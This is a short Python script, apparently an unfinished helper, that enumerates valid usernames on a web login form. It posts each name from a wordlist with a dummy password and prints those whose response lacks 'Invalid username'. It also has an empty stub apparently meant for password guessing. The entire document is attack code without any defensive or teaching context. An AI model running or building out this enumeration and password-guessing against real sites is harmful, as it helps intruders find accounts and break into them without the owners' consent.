from requests import post
from pathlib import Path

url = ''
headers = {}
cookies = {}
data = {}

def user_enum(url, user_file_list, headers, cookies):
    with Path(user_file_list).open('r') as file:
        lines = file.readlines()
        for line in lines:
            res = post(url=url, data={'username': line, 'password': 'asdf'})
            if 'Invalid username' not in res.text:
                print(line)

def pass_enum():
    pass